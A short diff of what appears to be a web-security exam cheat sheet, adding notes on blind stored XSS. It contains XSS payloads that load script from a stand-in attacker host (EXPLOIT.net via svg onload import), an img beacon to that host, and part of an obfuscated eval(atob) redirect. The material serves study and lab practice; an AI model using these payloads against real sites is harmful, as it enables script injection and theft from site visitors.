@@ -848,7 +848,10 @@ location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%
   
 ### Stored XSS
 
->Use the following sample code to ***identify*** stored XSS. If stored input is redirecting victim that click on the links, it send request to exploit server.  
+>Stored XSS can also be Blind XSS.
+>If alert payload do not trigger, see [NahamSec blind xss video](https://youtu.be/QSiXHb97E1c?si=ta4Rro6J39QlqVCR&t=428) payload for victim to click, example: `<svg/onload=import('//EXPLOIT.net/blind_xss')>`  
+>If stored input is redirecting victim that click on the links, it send request to exploit server.
+>Use the following sample code to ***identify*** stored XSS.  
 
 ```HTML
 <img src="https://EXPLOIT.net/img">
